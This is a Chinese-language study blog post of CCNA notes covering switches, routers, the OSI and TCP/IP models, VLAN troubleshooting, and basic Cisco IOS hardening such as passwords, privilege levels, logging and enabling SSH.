采行交换机可以将你的网络划分成更小的、更可管理的部分（就是网段，segments）。进而允许单位内部的不同部门，比如人力资源、财务、法务等等，得以同时在各自的网段上工作，这是十分有用的，因为同一部门的设备大部分时间都是用于各自之间的通信。 通过交换机，你还可以更好地使用 IP 电话，因为交换机端口能够通过端口为其供电（使用 PoE 接口）。基本的网络交换机用于： 1.连接诸如打印机和 PC 这样的网络设备 2.赋予网络服务器和路由器网络访问 3.使用 VLAN 对网络进行划分 VLAN 就是虚拟局域网。","text":"因为要混饭吃，被迫学习网络知识，顺便了解一下物理的网络结构 申明因为是自己用来学习的，大部分前辈都进行了很好的总结，我会将互联网各种资料整合起来,再加上自己的理解来写这篇文章，仅供个人学习用途 正文常见的网络设备1.网络交换机交换机使用内容可寻址存储器(Content Addressable Memory, CAM), 因此可以记住设备所插入的端口。思科公司生产的交换机被设计可用于从小型机构到有数千台设备的大型企业网络。 交换机的基本功能是利用设备的 MAC 地址（第二层）和 IP 地址（第三层）来运行，它们也能完成更为复杂的一些工作，比如包括基于 permit/deny（运行或访问）、协议及端口号（第四层），还有综合各层及其它方面的策略和规则的处理列表（porcessing lists）。 早期版本的交换机又被叫做网桥。网桥查看数据帧的源端口和 MAC 地址，以建立一个表并做出转发决定。在网桥上，有相应软件来访问这个表，在交换机上，则是由硬件（专用集成电路， Application Specific Integreated Chips, ASIC）去访问 CAM 表。因此交换机可以看成是一台多端口网桥。 采行交换机可以将你的网络划分成更小的、更可管理的部分（就是网段，segments）。进而允许单位内部的不同部门，比如人力资源、财务、法务等等，得以同时在各自的网段上工作，这是十分有用的，因为同一部门的设备大部分时间都是用于各自之间的通信。 通过交换机，你还可以更好地使用 IP 电话，因为交换机端口能够通过端口为其供电（使用 PoE 接口）。基本的网络交换机用于： 1.连接诸如打印机和 PC 这样的网络设备 2.赋予网络服务器和路由器网络访问 3.使用 VLAN 对网络进行划分 VLAN 就是虚拟局域网。 2.网络路由器作为一名思科工程师，你将耗费大量时间来对路由器进行安装、配置以及故障排除。为此，CCNA 大纲超过半数的内容都是用于学习路由器配置的。 路由器是用于建立网络的设备。与负责同一网络上的设备相互通信的交换机不同，路由器实现不同网络上的设备之间的通信。老旧型号的路由器上只有端口，这些端口都是物理内建与其中，固定在主板上的。这样的路由器仍然时不时的可以见到，但现代网络需要路由器具备 IP 电话、交换及安全以及能够连接到不同类型电讯公司的功能。因此，路由器是模块化的了，这就是说你有路由器机架和一些空着的插槽，能够连接大量的路由或交换模块。 路由器，routers 交换机，routers 有防火墙的路由器 无线路由器 多层交换机 防火墙 局域网和广域网拓扑 拓扑 物理 逻辑 星形 星形 总线 令牌环 星形 环形 点对点 总线 总线 FDDI 环形 环形 OSI 和 TCP 模型123456789开放标准互连（Open Standards Interconnection, OSI）是有国际标准化组织创建的。伴随技术喷发，网络设备和网络软件行业兴起了几家巨头，包括思科、微软、Novell、IBM、惠普、苹果以及其它几家公司。每家都有自己的线缆和端口类型，允许各自的商业性协议。此时，如你从一家买路由器、另一家买交换机，又从别家买服务器，就会出现兼容性问题。有一些处理这些问题的通容办法，比如在网络上部署网关来转换不同的协议，这会导致性能上的瓶颈（比如网络慢速部分）并会令到故障排除十分困难和费时。最终，厂商们不得不达成一个在各自产品上都能工作的通用标准，一套叫做 TCP/IP 的免费协议包。最后，那些未能采行 TCP/IP 的厂商失去市场份额，走向破产。ISO 创建出 OSI 模型，以助力于各厂商就通用标准达成一致，实现厂商之间的兼容。此模型包括了将总多网络功能分解为一套逻辑分层，或通俗地称为层的东西。各层只需完成其特定的一些功能，比如说你的公司专注于防火墙，那么这些防火墙将自然地与其它厂商的设备一起工作。此模型的优势在于每件设备设计用来出色完成一个角色，而非不充分地完成多个角色。客户可以根据其解决方案选出最好的设备，而不用死栓在一家厂商那里。同时故障排除也变得更为容易，因为确定的出错可被追踪到具体的某层。OSI 模型将所有网络功能划分为七个不同的层。该层次化模型从第七层一路去往第一层。那些离用户更近、更为复杂的功能，在顶部，一直到处于底层的网络线缆规格，如同表 层 层名 7 应用层，Application 6 表示层, Presentation 5 会话层, Session 4 传输层, Transport 3 网络层, Network 2 数据链路层, Data Link 1 物理层, Physical “All People Seem To Need Data Processing” 在数据为通过物理网络介质传输而自顶层传至底层时，数据被放入不同的逻辑数据套盒子。尽管我们常把这些数据盒子称作“包（packets）”, 实际上根据其处于 OSI 不同的层而有不同的名称。从 OSI 模型往下的数据处理，叫做封装。而往上的处理中从盒子里取出数据的过程，叫做解封装。 第七层 – 应用层这是到你我这些终端用户最近的层。应用层并非操作系统，但它通常提供了诸如 e-mail(SMTP 以及 POP3)、web 浏览（使用 HTTP）、以及文件传输服务（使用 FTP）。应用层决定了资源的可用性。 第六层–表示层表示层将数据提供给应用层。多媒体技术工作在这一层，你可以想到 MP4、JPEG、GIF 等等。而加密、解密以及数据压缩都发生在这一层。 第五层–会话层会话层的角色是建立、管理及中断设备之间的会话。这些动作发生在逻辑链路上，而真正干的事情是将两个软件应用程序连接起来。SQL、RPC 以及 NFS 都工作于会话层。 第四层–传输层传输层的角色是将来自更高层的数据分拆成被称为数据段（segments）的更小片。虚电路（virtual circuits）在这里建立，在设备之间能够通信之间有赖于虚电路的建立。 在数据得以跨网络传输前，传输层需要确认多少数据能发往远端设备。这取决于端到端链路的速率和可靠性。如你有一条高速链路，而终端用户只有一条低速链路，数据仍然需要以较小数据块进行发送。 以下是三种控制数据流的方法： 流控 flow control 窗口机制 windowing 通告机制 acknowledgements 流控如发往接收系统的信息多于它所能处理的量时，它将请求发送系统暂停一段时间。这一般发生在一段使用宽带而另一端使用拨号上网的时候。这个用于通知其它设备停止的包叫做源抑制消息（a source quench message）。 窗口机制窗口机制下，每个系统就能在收到应答（acknowledgement）前发送多少数据达成一致。”窗口”随着数据的传输时开时合，以维持一个持续的数据流。 通告机制在收到一定数量的数据段后，接收端需要就这些数据段的安全抵达和顺序正确，通告发送端。 1234567这些都是在一个叫做三次握手（a three-way handshake）的过程中达成一致。你要发出一个包来建立会话。第一个包叫做同步(synchronise, SYN)包。远端设备以同步应答（a synchronise acknowledgement, SYN-ACK）包予以回应。第三步的应答包（acknowledgement, ACK）的发出标志着会话的建立。这都是通过 TCP 业务完成的。传输层包含了好几个协议，其中最熟知的是传输控制协议（Tranmission Control Protocol, TCP）和用户数据报协议（User Datagram Protocol, UDP）, 它们都是 TCP/IP 协议包的组成部分。这个协议包因为是互联网所使用的标准而相当出名。TCP 是面向连接的协议。它使用了三次握手、窗口机制以及其它技巧来保证数据安全地到达其目的地。有许多协议都使用了 TCP， 比如 Telnet、HTTPS 以及 FTP（尽管 FTP 位于应用层，它确实使用了 TCP）。UDP 是一个无连接协议（a connectionless protocol）。它在对数据包进行编号后就发往目的地了。它绝不会管这些数据包是否安全抵达，也绝不会在发送数据包前建立一条连接。在数据不是那么重要，应用开发者觉得信息总是可以在未能到达目的地时重新发送时，往往采用 UDP。那么为什么要用到 UDP 呢？ TCP 协议本身会消耗许多网络的带宽，甚至在数据还没发送时，为建立其连接，也要往复发送很多流量。这都会耗去一些宝贵的时间和网络资源。UDP 数据包比起 TCP 包要小很多，在无需真正可靠连接时，它是是否有用的。使用到 UDP 的协议有 TFTP 等。 第三层 – 网络层123网络层接手来自传输层的数据段，将其拆分为叫做数据包的更小单位。许多网络工程师不管在 OSI 的哪层，都把数据叫做包，这也是可以的。但是，请记住，技术上说只有在网络层，才可以叫包。网络层必须确定从一个网络到另一网络的最优路径；为此，路由器工作在该层。路由器在此采用逻辑寻址，而 TCP/IP 的寻址方式是 IP 寻址，稍后会讲到。 第二层–数据链路层123数据链路层将数据包拆分成帧这种更小的单位。二层交换机工作在这层，使用硬件地址，或是 MAC 地址，它们之所以能够更快地交换流量，是因为无需查看 IP 地址和路由表。广域网协议工作在第二层，包括 HDLC、ISDN 以及 PPP。以太网也是第二层的。为了向其上下两层提供接口-，数据链路层又分了两个子层，分别是逻辑链路控制子层（the Logical Link Control, LLC）, 以及介质访问控制子层（ the Media Access Control, MAC）。逻辑链路控制子层与网络层交互，介质访问控制子层与物理层交互。 第一层–物理层1在这层上，帧被转换为位，以将其放到线路上。这些位是由电脉冲构成，读作“开”“关”位，或是二进制的 1 和 0。集线器工作于此层，在这里你会找到线缆规格，比如 RJ45。 OSI故障排查123456789101112在对你的网络进行故障排除时，采用层次化方法是十分有效的。至此，你唯一要明确的是从哪个方向上运用 OSI 协议栈，是自顶向下呢，还是自底往上，抑或采用分而治之、各个击破方法，这又涉及到聚焦网络的那些部分。我建议在初期采用自底向上的方法，对于通常处在较低的层上的问题，比如因为线缆松掉或破损、或者配置了不正确的 IP 地址时，你无需浪费时间在检查应用上。在你有更多经验后，在处理某些故障现象时采用各个击破方法会更为快速。在从底层往上处理问题时，你大概会做下面这些事情：第一层 -- 所有线缆都恰当地插入到端口了吗? 还是有的松掉了？ 网线头已经弯掉或是磨损了吗？如果网线有问题，设备上的指示灯会呈黄色，而非正常的绿色。是有人没有往接口上配置正确的速率吗？以太网端口速率有被设置正确吗？接口有开放给网络管理员以使用吗？第二层 -- 接口有采用正确的协议，比如 Ethernet/PPP/HDLC, 以便能够与另一端保持一致吗？第三层 -- 接口有使用正确的 IP 地址以及子网掩码？第四层 -- 有使用正确的路由协议吗？从路由器通告的网络是正确的吗？ TCP&#x2F;IP、DoD 模型TCP&#x2F;IP 模型是另一个框架，作为 OSI 模型的替代。它是由 高级防务研究项目署（the Defense Advanced Research Projects Agency，DARPA）创建的四层或五层模型。它就是为人熟知的国防部模型。自顶向下的四层分别是： 12344 - 应用, Application [Telnet/FTP/DNS/RIP]3 - 传输/主机到主机，Transport/Host-to-Host [UDP/TCP/ICMP]2 - 互联网/网际网络, Internet or Internetwork [IPSec/IP]1 - 链路/网络接口，Link/Network Interface [Frame Relay/Ethernet/ATM] TCP&#x2F;IP 模型已由四层更新为五层，所以你会在考试中被问到有关五层 TCP 模型（a five-layered TCP model）的问题。较高的层离用户较近，而较低的层描述了其它系统交互时所采用的技术或协议。五层 TCP 模型如下所示： 123455 - 应用, Application [Telnet/FTP/DNS/RIP]4 - 传输/主机到主机，Transport/Host-to-Host [UDP/TCP/ICMP]3 - 网络层，Network [IPSec/IP]2 - 数据链路层，Data Link [Ethernet/Frame Relay/PPP]1 - 链路/网络接口/物理，Link/Network Interface/Physical [Bits on the wire] 五层的 TCP 模型具有更细的粒度，能更精确地表示数据放在线路之前所发生的事情。比如在第二层处，进行了数据封装以及寻址（如数据链路寻址）。考试中思科偏向选择五层模型。 数据会如同上述的 OSI 模型那样在自应用层往物理层的途中进行封装，如表 所示： 应用，Application 仍未封装的数据， 传输，Transport 将 TCP 头部添加到数据上，TCP header added to the data 段，Segment 网络，Network IP 头部被添加上去（包括 IP 地址）, IP header added(including IP address) 包，Packet 数据链路，Data Link 添加数据链路头部（数据链路地址）, Data Link header added(Data Link address) 帧，Frame 物理，Physical 转变成电信号, Turned into electrical signals 线路上的位，Bits on the wire 你可能会被问及 TCP&#x2F;IP 模型与 OSI 模型的对应关系。如表 所示： 层号，Layer # OSI 模型 TCP 模型 7 应用, Application 应用, Application 6 表示, Presentation 应用, Application 5 会话, Session 应用, Application 4 传输, Transport 主机到主机, Host to Host 3 网络, Network 网际网络, Internetwork 2 数据链路, Data Link 网络接口, Network Interface 1 物理, Physical 网络接口, Network Interface 1.总述&#x3D;&#x3D;&#x3D;1 中继链路 动态中继协议 原生vlan vlan之间路由 vtp虚拟局域网中继协议 故障排查： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172VLAN 故障排除基础， Basic VLAN TroubleshootingVLANs 是一种相当直观的交换机特性，它很少需要进行故障排除。你所发现的问题，大部分都是人为配置错误。在第 15 天的课程中，我们会详细讲到二层故障排除。而一些常见的涉及 VLAN 的问题有这些。VLAN 间路由无效，Inter-VLAN routing not working: 检查交换机之间的链路、路由器都是正确设置的，以及相关的 VLANs 允许通过且未被修剪（参照 “VTP 修剪” 部分）。show interface trunk 命令将提供所需信息。还要检查路由器子接口有配置了正确的封方式和 VLAN，同时子接口的 IP 地址是那些主机的默认网关。无法创建 VLANs， VLANs cannot be created: 检查交换机的 VTP 模式是否被设置成了 “client”。在 VTP 模式为 “client” 时，是不能创建 VLANs 的。另一个重要原因是交换机所允许的 VLANs 编号。show vtp status 命令将提供所需的信息（参看下的“中继和 VTP 故障排除”部分）。同一 VLAN 中的主机之间不能通信，Hosts within the same VLAN cannot reach each other: 重要的是某 VLAN 中的主机都要有一个属于同一子网的 IP 地址。如子网不同，它们之间就无法通信。另一个需要考虑的原因是这些主机是否都是连接到同一台交换机上。如它们不是连接到同一交换机，就要确保交换机之间的中继链路工作正常，还要确保该 VLAN 未在允许清单中被排除/被修剪[ensure that the trunk links(s) between the switches is/are working correctly and that the VLAN is not excluded/not pruned from the allowed list]。show interface trunk 命令将给出有关该中继链路的所需信息。中继和 VTP 故障排除，Troubleshooting Trunking and VTP下面是一些问题实例机器可能的解决方法。中继宕掉？接口务必要是 up/up中继链路两端的封装方式要匹配SwitchA#show interface fa1/1 switchportName: Fa1/1Switchport: EnabledAdministrative Mode: trunkOperational Mode: trunkAdministrative Trunking Encapsulation: dot1qOperational Trunking Encapsulation: dot1qNegotiation of Trunking: DisabledAccess Mode VLAN: 0 ((Inactive))VLAN 信息未有传输该 VLAN 在中继链路上阻塞了吗Switch#show interface trunkVTP 信息无法到达 VTP 客户端VTP 域名称密码正确吗？show vtp status / show vtp password在增加一台新的交换机后，所有 VTP 信息都变动了总是客户端模式加入新的交换机（但请查看上面的有关“配置修订号（the configuration revision number）”的提示）服务器模式将通告新信息VTP 修剪无效中间是否有一台透明交换机？该 VLAN 允许通过该中继链路？VLAN 间路由故障排除， Troubleshooting Inter-VLAN RoutingVLAN 间路由故障可以多种形式出现，尤其是考虑在该过程中涉及多种设备（交换机、路由器等）。通过下面给出的适当故障排除方法论，你就能够将问题孤立在某台特定设备上，接着再其对应到一个错误配置的具体特性。从连通性立足点上看，下面这些情事都应该检查一下。检查一下终端主机连接了正确的交换机端口检查一下正确的交换机端口连接了正确的路由器端口（如使用了一台路由器做 VLAN 间路由）检查一下在此过程中所涉及到的每个端口承载的是正确的 VLANs连接终端站的那些端口，通常是被分配到一个特定 VLAN 的接入端口而将交换机连接至路由器的那些端口，则通常是中继端口在确认设备之间的连通性无误后，逻辑上下一步就是检查二层配置了，以所配置的中继端口上的封装方式开始, 这通常是作为首选的 802.1Q 封装方式。接着就要确保中继链路两端都是配置了同样的封装方式。可用于查看封类型的一些命令有以下这些。show interface trunkshow interface &lt;number&gt; switchport这里有个输出示例。Cat-3550-1#show interfaces trunkPort Mode Encapsulation Status Native vlanFa0/1 on 802.1q trunking 1Fa0/2 on 802.1q trunking 1Port Vlans allowed on trunkFa0/1 1,10,20,30,40,50Fa0/2 1-99,201-4094命令 show interface trunk 提供的另一重要细节是中继状态。从中继状态可以看出中继是否形成，同时在链路两端都要检查中继状态。如果接口未处于“中继”模式，那么接口的运行模式（on, auto, 等）是最重要的检查项，以弄清接口能否允许与链路另一端形成中继态（a trunking state）。中继端口上另外一个需要检查的重要元素便是原生 VLAN。原生 VLAN 错误配置可能带来功能缺失，抑或安全问题。中继链路的两端的原生 VLAN 需要匹配。假如在完成二层检查任务后，VLAN 间路由问题仍然存在，你就可以继续进行三层配置检查了。依据用于实现 VLAN 间路由的三层设备，可能会在下列设备上进行配置及配置检查。多层交换机，multilayer switch路由器 -- 物理接口， router -- physical interfaces路由器 -- 子接口，router -- subinterfaces三层设备上应该检查一下其各接口（或者交换机虚拟接口，SVI）都有分配的正确的子网，同时如有必要，你还应检查一下路由协议。通常情况下，各个 VLAN 都有分配不同的子网，所以你应确保你未曾错误配置了接口。而为检查此项，你可以对特定物理接口、子接口或是 SVI，使用 show interface 命令。 2.总述&#x3D;&#x3D;&#x3D;2安全相关 物理访问防护 访问台访问 12345678910111213141516171819202122控制台访问控制台接口是设计用于提供到路由器的物理访问的，以完成路由器的初始设置及灾难恢复。任何能取得控制台访问的人，都能够完全擦出或是重新配置这些文件，因此，控制台接口应有一个口令进行保护，可以简单地添加一个口令，也可以为其添加一个本地用户名和口令，如下面所示。只添加一个口令即可Router(config)#line console 0Router(config-line)#password ciscoRouter(config-line)#login为控制台添加一个本地用户名和口令组合Router(config)#username paul password ciscoRouter(config)#line console 0Router(config-line)#login local你还可以为控制台（以及虚拟终端）线路创建一个超时值，如此就可以在确定的时间过后断开连接。默认的超时是5分钟。Router(config)#line console 0Router(config-line)#exec-timeout ? &lt;0-35791&gt; Timeout in minutesRouter(config-line)#exec-timeout 2 ? &lt;0-2147483&gt; Timeout in seconds &lt;cr&gt;Router(config-line)#exec-timeout 2 30Router(config-line)# 远程登陆访问，Telnet Access 1234567891011121314151617181920在某人给远程登陆或者说虚拟终端线路添加了口令之前，你实际上是不能远程登陆进一台路由器的。同样，你可以给虚拟终端线路添加一个口令，或是告诉路由器去查找一个本地用户名及口令组合（该组合可以在配置文件中，或是存储在一台 RADIUS/TACACS 服务器上），如下面所示。Router(config-line)#line vty 0 15Router(config-line)#password ciscoRouter(config-line)#login ← or login local下面的输出是自某台路由器到另一台的远程登陆会话。当你获得远程登陆访问时，你可以看到主机名发生了改变。注意在你输入口令时，它看不到。Router1#telnet 192.168.1.2Trying 192.168.1.2 ...OpenUser Access VerificationUsername: paulPassword:Router2&gt;而如你有一个安全版 IOS 镜像，则可以将路由器配置为仅允许安全壳访问，而不是远程登陆访问。这样做的好处在于所有数据都是加密了的。如你在启用安全壳后，再次使用远程登时，连接将被终止。Router1(config)#line vty 0 15Router1(config-line)#transport input sshRouter2#telnet 192.168.1.2Trying 192.168.1.2 ...Open[Connection to 192.168.1.2 closed by foreign host] 使能模式保护，Protecting Enable Mode 12345678910111213141516171819202122232425使能模式（enable mode）取得路由器的配置访问，因此你会想要保护该模式。你可以配置一个使能秘密（an enable secret）或使能口令（an enable password）。实际上，使能秘密和使能口令是可以同时有的，但这是一个坏主意。使能口令是未加密的，所以在路由器配置中可以看到。而使能秘密有 5 级加密(level 5 encryption, MD5)，难于破解。自 15.0(1）S 后的较新 IOS 版本中，还可以使用比 MD5 加密高级的 4 级加密（level 4 encryption, SHA256）, 5 级加密最终会不赞成使用。你可以给使能口令加上命令 service password-encryption, 但因为此方式使用 7 级加密(level 7 encryption, 比如，低安全性；思科称其为“背后安全性，over the shoulder security”, 因其仅需某人从你背后偷看并记住一个稍难的词组，便可以用网上的 7 级口令解密工具予以破解)，而很容易被破解。下面的输出中可以看到 7 级与 5 级加密文本。Router(config)#enable password ciscoRouter(config)#exitRouter#show runenable password ciscoRouter(config)#enable password ciscoRouter(config)#service password-encryptionRouter#show runenable password 7 0822455D0A16Router(config)#enable secret ciscoRouter(config)#exitRouter#show runenable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0记住如你忘记了使能口令，你将不得不对路由器或交换机进行一下口令恢复操作。请用 Google 搜索你所使用的型号，因为型号不同其口令恢复过程也不一样。对于路由器来说，涉及设备重启，以及在重启过程中按下指定的中断键盘按键再设置配置寄存器（the configuration register）以跳过启动配置文件（通常将配置寄存器设置为 0x2142）接着要执行一个 copy start-config running-config 命令此时，就可以创建新的口令了。而对交换机来说，口令恢复过程会有一点复杂（请再次用 Google 搜索你用到的具体交换机型号），但也可以通过一个小把戏实现口令恢复 -- 在给交换机上电时，按住 MODE 按钮8秒钟。交换机将以空白配置启动，而上一次的启动配置(the last startup configuration)将保存在 flash 中的 config.text.renamed 文件里头，所以该文件可复制用于运行配置(running configuration)，然后用其它口令对其进行修改。 用户访问防护，Protecting User Access 12345678910111213141516171819202122232425262728293031323334353637383940414243444546思科 IOS 提供对用户的单独用户名及口令，同时对所能够使用的命令进行清单限制的能力。这在分层次网络支持时是有用的。下列输出中给出了一个示例。RouterA#config termEnter configuration commands, one per line. End with CNTL/Z.RouterA(config)#username paul password ciscoRouterA(config)#username stuart password helloRouterA(config)#username davie password footballRouterA(config)#line vty 0 4RouterA(config-line)#login localRouterA(config-line)#exitRouterA(config)#exit你可在路由器上指派不同用户帐号的访问级别。比如，你也许打算那些初级网络团队成员仅能使用一些基本的故障排除命。你还有必要记住思科路由器有口令安全的两种模式（two modes of password security），用户模式（Exec mode）和特权模式（Enable mode）。思科路由器有可供配置的 16 种（0 到 15）不同特权级别，其中 15 级是完全的访问权限，如下所示。RouterA#conf tEnter configuration commands, one per line. End with CNTL/Z.RouterA(config)#username support privilege 4 password soccer LINE Initial keywords of the command to modifyRouterA(config)#privilege exec level 4 pingRouterA(config)#privilege exec level 4 tracerouteRouterA(config)#privilege exec level 4 show ip interface briefRouterA(config)#line console 0RouterA(config-line)#password basketballRouterA(config-line)#login local ← password is neededRouterA(config-line)#^z支持那人在登入到路由器并尝试进入配置模式时，此命令及其它命令将不可用且无效，也不能看到。RouterA con0 is now availablePress RETURN to get started.User Access VerificationUsername: supportPassword:RouterA#config t ← not allowed to use this ^% Invalid input detected at ‘^’ marker.你可在路由器提示符下查看默认的不同特权级别(the default privilege levels)。Router&gt;show privilegeCurrent privilege level is 1Router&gt;enRouter#show privRouter#show privilegeCurrent privilege level is 15Router# 更新 IOS， updating the IOS 12345公认地，更新 IOS 有时会将漏洞或故障引入你的网络中，因此，如你有与思科公司有个技术支持合同（a TAC contract, Technical Assistance Centre, TAC), 那么最好的做法就是依据思科公司的建议来做。一般来讲，保持 IOS 版本最新是高度推荐的做法。藉由更新 IOS， 你能得到下面这些好处。修正已知的软件缺陷，fixed known bugs解决安全隐患，cloese security vulnerabilities提供特性强化及 IOS 能力提升，Offers enhanced features and IOS capabilities 路由器日志记录，Router Logging 1234567891011121314151617181920212223242526272829303132333435363738394041424344路由器提供事件记录的能力。它们可将日志消息照你的意愿，发送到屏幕或某台服务器。你应该记录路由器消息，而又有8个可用的日志记录严重程度级别（考试要求你知道这些不同的级别），如下面输出中的粗体字所示。logging buffered ?`&lt;0-7&gt;`Logging severity levelalerts—Immediate action needed (severity=1)critical—Critical conditions (severity=2)debugging—Debugging messages (severity=7)emergencies—System is unusable (severity=0)errors—Error conditions (severity=3)informational—Informational messages (severity=6)notifications—Normal but significant conditions (severity=5)warnings—Warning conditions (severity=4)而你有可以将这些日志消息发往几个不同的地方。Router(config)#logging ? A.B.C.D IP address of the logging host buffered Set buffered logging parameters console Set console logging parameters host Set syslog server IP address and parameters on Enable logging to all enabled destinations trap Set syslog server logging level userinfo Enable logging of user info on privileged mode enabling日志消息通常会在你经由控制台进入到路由器时，显示在屏幕上。而这可能会在你敲入配置命令时多少有些烦人。这里就有个在我输入一个命令（加了下划线的那条）时，被一条控制台日志消息(a console logging message)给中断了的例子。Router(config)#int f0/1Router(config-if)#no shutRouter(config-if)#endRouter#*Jun 27 02:06:59.951: %SYS-5-CONFIG_I: Configured from console by console &lt;u&gt;show ver&lt;/u&gt;*Jun 27 02:07:01.151: %LINK-3-UPDOWN: Interface FastEthernet0/1, changed state to up此时你既可以用命令 no logging console 关闭日志消息输出，也可以用 logging synchronous 命令将它们设置为无中断（not interrupt）， logging synchronous 命令会重新输入在被日志消息中断之前，你所输入的那行命令。logging synchronous 命令在虚拟终端线路上也是可用的。Router(config)#line con 0Router(config-line)#logging synchronousRouter(config-line)#Router(config-line)#exitRouter(config)#int f0/1Router(config-if)#shutRouter(config-if)#exitRouter(config)#*Jun 27 02:12:46.143: %LINK-5-CHANGED: Interface FastEthernet0/1, changed state toadministratively downRouter(config)#exit这里值得一提的是，在你经由 Telnet (或 SSH) 进入到路由器时，你是不会看到控制台输的。如你想在此时看到日志消息，执行 terminal monitor 命令即可。 简单网络管理协议，Simple Network Management Protocol, SNMP 12345SNMP 是一种可用于远程管理网络的服务。它由一台网络管理员维护、运行了 SNMP 管理软件的中心工作站，及包括路由器、交换机及服务器等的，各台网络设备上的小文件（代理，agents）构成。包括 HP、Cisco、IBM 及 SolarWinds 等的几家厂商，都有设计 SNMP 软件。也有很多开发源代码版本的 SNMP 软件可用。这类软件允许你监测设备的带宽及活动情况，比如登陆活动以及端口状态等。运用 SNMP， 你可以远程地配置或是关闭端口和设备。你也可以将其配置在某些条件触发时，诸如出现高带宽或是端口宕掉时，发出警告消息。我们会在第 40 天来讲 SNMP 的细节，因为 SNMP 是 ICND2 大纲的部分。 加固交换机，Securing the Switch 123456阻止远程登陆访问，Prevent Telnet Access远程登陆流量以明文方式发送口令，这就是说，可轻易地在配置中读取口令，或是有人接到你的网络上，那么就能通过网络嗅探软件查看到口令。默认情况下，远程登陆实际上是关闭的（也就是说，你需要为其设置一个口令，也可选择设置一个用户名，来让其工作）。不过，如你仍想要有对管理端口的远程访问的话，你可使用命令 transport input ssh, 开启到交换机的 SSH 通信，这已在前面讨论过了。Farai 说 -- “所有虚拟终端线路下，命令 transport input all 是默认开启的，而其它线路的 transport input none 命令是默认开启的。” 开启 SSH， Enable SSH 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108尽可能地采用 SSH 而不是 Telnet 及 SNMP 来访问你的交换机。SSH 表示安全壳(secure shell), 令到某网络上的两台设备之间信息的安全交换。SSH 采用公钥加密法（pubic-key cryptography）来认证连接设备。Telnet 及 SNMP 版本 1 和 2 都是未加密的，易受包嗅探（packet sniffing）的影响， SNMP 版本 3 提供了保密性 -- 数据包有加密以防止恶意源窃取数据（snooping by an unauthorised source）。要开启 SSH， 你需要有一个支持加密的 IOS 版本。一种快速找出 IOS 镜像是否支持加密的方法是执 show version 命令。查找镜像文件名中有无 k9 字样，或者在思科系统公司的安全性声明中查找有关字句。Switch#sh versionCisco IOS Software, C3560 Software (C3560-ADVIPSERVICES K9-M), Version12.2(35)SE1, RELEASE SOFTWARE (fc1)Copyright (c) 1986-2006 by Cisco Systems, Inc.Compiled Tue 19-Dec-06 10:54 by antonioImage text-base: 0x00003000, data-base: 0x01362CA0ROM: Bootstrap program is C3560 boot loaderBOOTLDR: C3560 Boot Loader (C3560-HBOOT-M) Version 12.2(25r)SEC, RELEASESOFTWARE (fc4)Switch uptime is 1 hour, 8 minutesSystem returned to ROM by power-onSystem image file is “flash:/c3560-advipservicesk9-mz.122-35.SE1.bin”This product contains cryptographic features and is subject to United States and localcountry laws governing import, export, transfer and use. Delivery of Cisco cryptographicproducts does not imply third-party authority to import, export, distribute or useencryption. Importers, exporters, distributors and users are responsible for compliancewith U.S. and local country laws. By using this product you agree to comply withapplicable laws and regulations. If you are unable to comply with U.S. and local laws,return this product immediately. A summary of U.S. laws governing Cisco cryptographicproducts may be found at:http://www.cisco.com/wwl/export/crypto/tool/stqrg.htmlIf you require further assistance please contact us by sending email to export@cisco.com.--More-注意: 如你没有带有安全特性版本的 IOS，你就必须为此付费购买。为建立加密连接，你需要在交换机上创建一对公钥和私钥（a private/public key, 见下面）。在连接时，你这边使用公钥加密数据，交换机将会使用它的私钥来解密数据。而在认证时，使用你所选择的用户名/口令组合。下一个问题是，要设置交换机的主机名和域名（hostname and domain name）, 因为在创建公钥/私钥对时，会用到主机名.域名命名法（hostname.domainname nomenclature）。显然，在命名主机名和域名时，将其命名为能够代表系统的有意义名字，是好的做法。首先，你要给交换机一个与默认主机名 Switch 不一样的主机名。接着，添加其域名（该域名通常与 Windows 活动目录的 FQDN 一致）。这时就可以创建用于秘密的密钥（the crypto key）了。系数/模量（the modulus） 是指你所希望使用的密钥的长度，取值范围是 360 到 2048, 后者具有最高的安全性；高于 1024 位的模量就认为是安全的了。此时，交换机上的 SSH 就已经开启了。有一些 SSH 相关的维护命令需要输入。ip ssh time-out 60 命令会将任何空闲 60 秒的 SSH 连接置为超时。而命令 ip ssh authentication-retries 2 则会在认证失败两次的 SSH 连接重置为初始状态。此设置并不会阻止用户建立新的连接并重试认证。设置过程如下所示。Switch(config)#hostname SwitchOneSwitchOne(config)#ip domain-name mydomain.comSwitchOne(config)#crypto key generate rsaEnter modulus: 1024SwitchOne(config)#ip ssh time-out 60SwitchOne(config)#ip ssh authentication-retries 2可使用命令 ip ssh version 2 开启 SSH 版本2。让我们看看其中一个密钥。在这个实例中，该密钥是为 HTTPS 生成的。因为其是在开启 HTTPS 时自动生成的，所以其名称也会自动产生。firewall#show crypto key mypubkey rsaKey name: HTTPS_SS_CERT_KEYPAIR.serverTemporary keyUsage: Encryption KeyKey is not exportable.Key Data:306C300D 06092A86 4886F70D 01010105 00035B00 30580251 00C41B63 8EF294A1DC0F7378 7EF410F6 6254750F 475DAD71 4E1CD15E 1D9086A8 BD175433 1302F4032FD22F82 C311769F 9C75B7D2 1E50D315 EFA0E940 DF44AD5A F717BF17 A3CEDBE1A6A2D601 45F313B6 6B020301 0001要验证交换机上的 SSH 开启，输入以下命令。Switch#show ip sshSSH Enabled - version 1.99Authentication timeout: 120 secs; Authentication retries: 2Switch#而用一个简单的命令，就可以关闭 HTTP 访问。Switch(config)#no ip http server查看交换机上 HTTP 服务器的状态。Switch#show ip http server statusHTTP server status: DisabledHTTP server port: 80HTTP server authentication method: enableHTTP server access class: 0HTTP server base path: flash:htmlMaximum number of concurrent server connections allowed: 16Server idle time-out: 180 secondsServer life time-out: 180 secondsMaximum number of requests allowed on a connection: 25HTTP server active session modules: ALLHTTP secure server capability: PresentHTTP secure server status: EnabledHTTP secure server port: 443HTTP secure server ciphersuite: 3des-ede-cbc-sha des-cbc-sha rc4-128-md5 rc4-12HTTP secure server client authentication: DisabledHTTP secure server trustpoint:HTTP secure server active session modules: ALL还可以在 VTY 线路上应用控制列表（an access control list, ACL）。在第9天的课程将会讲到。设置使能秘密口令，Set an Enable Secret 